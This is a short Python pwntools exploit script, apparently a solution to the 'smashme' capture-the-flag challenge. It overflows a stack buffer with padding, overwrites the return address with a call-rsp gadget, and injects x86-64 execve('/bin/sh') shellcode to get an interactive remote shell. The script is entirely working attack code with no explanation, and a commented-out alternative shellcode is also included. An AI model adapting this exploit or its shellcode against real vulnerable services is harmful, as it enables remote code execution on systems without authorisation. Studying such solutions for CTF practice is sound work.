from pwn import *

callrsp = 0x400bfc
#shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
#shellcode += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
shellcode =  "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

s = remote('smashme_omgbabysfirst.quals.shallweplayaga.me', 57348)
str1 = 'Smash me outside, how bout dAAAAAAAAAAAaaa'

payload = str1 + 'A' * (72 - len(str1))
payload += p64(callrsp) + shellcode

s.recvuntil('?\n')
s.sendline(payload)
s.interactive()
